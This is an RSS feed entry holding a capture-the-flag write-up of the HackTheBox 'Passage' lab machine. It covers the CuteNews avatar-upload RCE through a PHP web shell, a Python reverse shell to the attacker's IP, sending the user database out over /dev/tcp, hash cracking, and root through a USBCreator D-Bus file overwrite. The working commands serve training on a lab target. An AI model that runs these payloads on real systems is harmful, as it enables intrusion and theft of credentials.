<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>gdbus on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/gdbus/</link>
    <description>Recent content in gdbus on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 07 May 2021 19:30:38 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/gdbus/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Passage</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</link>
      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</guid>
      <description>Leveraging USBCreator for local privilege escalation on Linux</description>
      <content:encoded><![CDATA[<p>Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user. There is an unpatched package called USBCreator that allows an attacker to perform Arbitrary File Write as root without supplying a password.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>
<p>CuteNews 2.1.2 exploitation</p>
</li>
<li>
<p>USBCreator D-bus exploitation</p>
</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li>gdbus - Preinstalled in the target machine.</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN initial-passage -v 10.10.10.206
<span class="c1"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
Nmap scan report <span class="k">for</span> 10.10.10.206
Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span> http-methods:
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Passage News
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
<p><img class="img-container" src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  />
</p>
<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
<p><img class="img-container" src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  />
</p>
<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname as <code>passage.htb</code>.</p>
<p><img class="img-container" src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  />
</p>
<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
<p><img class="img-container" src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  />
</p>
<p>I can register as normal user.</p>
<p><img class="img-container" src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  />
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ searchsploit <span class="s1">&#39;CuteNews 2.1.2&#39;</span>
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     <span class="p">|</span>  Path
------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - <span class="s1">&#39;avatar&#39;</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>       <span class="p">|</span> php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                           <span class="p">|</span> php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload               <span class="p">|</span> php/webapps/48458.txt
------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
<blockquote>
<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
Header content of the file can be changed and the control can be bypassed.
We can use the &ldquo;GIF&rdquo; header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE.</p>
</blockquote>
<p>I can also exploit this manually.</p>
<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
<p><img class="img-container" src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  />
</p>
<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
<p><img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" /></p>
<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span class="o">=</span>python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ rlwrap nc -nvlp <span class="m">9001</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">37062</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1678<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ id
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
www-data@passage:/var/www/html/CuteNews/uploads$
www-data@passage:/var/www/html/CuteNews/uploads$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-paul">Shell as paul</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are two users in home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
ls -l /home
total <span class="m">8</span>
drwxr-x--- <span class="m">17</span> nadav nadav  <span class="m">4096</span> Mar <span class="m">5</span> 09:21 nadav
drwxr-x--- <span class="m">17</span> paul  paul   <span class="m">4096</span> Mar <span class="m">5</span> 08:32 paul
</code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
<p><img class="img-container" src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  />
</p>
<blockquote>
<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
</blockquote>
<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
</code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ nc -nvlp <span class="m">9000</span> &gt; cdata.users
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">55022</span>
</code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:16:<span class="s2">&#34;paul@passage.htb&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;paul-coles&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>i:1598829833<span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;ahaha@gmail.com&#34;</span><span class="p">;</span>s:8:<span class="s2">&#34;ivanpogi&#34;</span><span class="p">;</span><span class="o">}}</span>a:2:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;egre55@test.com&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>a:11:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;1599412470&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:3:<span class="s2">&#34;acl&#34;</span><span class="p">;</span>s:1:<span class="s2">&#34;4&#34;</span><span class="p">;</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>s:13:<span class="s2">&#34;debo@debo.com&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;nick&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;pass&#34;</span><span class="p">;</span>s:64:<span class="s2">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;more&#34;</span><span class="p">;</span>s:60:<span class="s2">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;avatar&#34;</span><span class="p">;</span>s:20:<span class="s2">&#34;avatar_debo_bash.php&#34;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>And that was a mess.</p>
<p>Among those outputs, this one concerns me.</p>
<pre><code>&quot;pass&quot;;s:64:&quot;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&quot;
</code></pre><p><code>hash-identifier</code> identifies it as SHA-256.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
   <span class="c1">#########################################################################</span>
   <span class="c1">#     __  __                     __           ______    _____           #</span>
   <span class="c1">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
   <span class="c1">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
   <span class="c1">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
   <span class="c1">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
   <span class="c1">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
   <span class="c1">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
   <span class="c1">#                                                             By Zion3R #</span>
   <span class="c1">#                                                    www.Blackploit.com #</span>
   <span class="c1">#                                                   Root@Blackploit.com #</span>
   <span class="c1">#########################################################################</span>
--------------------------------------------------

Possible Hashs:
<span class="o">[</span>+<span class="o">]</span> SHA-256
<span class="o">[</span>+<span class="o">]</span> Haval-256
...&lt;SNIP&gt;...
</code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
<p><img class="img-container" src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  />
</p>
<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> grep -o -E -e <span class="s2">&#34;[0-9a-f]{64}&#34;</span>
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
</code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
<p><code>hashcat</code> recovered five passwords.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ./hashcat.exe -m <span class="m">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
</code></pre></div><h4 id="su---paul">SU - paul</h4>
<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@passage:/home$ su paul 
su paul
Password: atlanta1
paul@passage:~$ 
</code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ cat id_rsa.pub <span class="o">&amp;&amp;</span> authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ ssh nadav@passage.htb
Last login: Sun Sep  <span class="m">6</span> 11:12:03 <span class="m">2020</span> from 127.0.0.1
nadav@passage:~$ id
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,128<span class="o">(</span>sambashare<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal enumeration</h4>
<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file.</p>
<p><img class="img-container" src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  />
</p>
<p>The file contains the following information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g


...&lt;SNIP&gt;...
# File marks:
&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        &#34;       12      7

&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        &#34;       2       0
        .       2       0
        +       2       0
</code></pre></div><p>The history of files points to these two configuration files:</p>
<ul>
<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
</ul>
<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
<span class="o">[</span>Configuration<span class="o">]</span>
<span class="nv">AdminIdentities</span><span class="o">=</span>unix-group:sudo<span class="p">;</span>unix-group:admin
</code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
<span class="cp">&lt;!DOCTYPE busconfig PUBLIC
</span><span class="cp"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span><span class="cp"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
<span class="nt">&lt;busconfig&gt;</span>

  <span class="c">&lt;!-- Only root can own the service --&gt;</span>
  <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">&#34;root&#34;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">own=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/policy&gt;</span>

  <span class="c">&lt;!-- Allow anyone to invoke methods (further constrained by
</span><span class="c">       PolicyKit privileges --&gt;</span>
  <span class="nt">&lt;policy</span> <span class="na">context=</span><span class="s">&#34;default&#34;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
           <span class="na">send_interface=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Properties&#34;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/policy&gt;</span>

<span class="nt">&lt;/busconfig&gt;</span>
</code></pre></div><p>From here, From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
<p><img class="img-container" src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  />
</p>
<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nadav@passage:~$ uname -a
Linux passage 4.15.0-45-generic <span class="c1">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys <span class="nb">true</span>
<span class="nb">true</span>
<span class="o">()</span>
</code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «passage» «10.10.14.31»
$ ssh -i root_rsa root@10.10.10.206
Last login: Fri Mar  5 17:33:39 2020 from 10.10.14.7
root@passage:~# ls -l
total 12
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
-r-------- 1 root root   33 Mar  5 17:05 root.txt
root@passage:~# 
</code></pre></div><section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
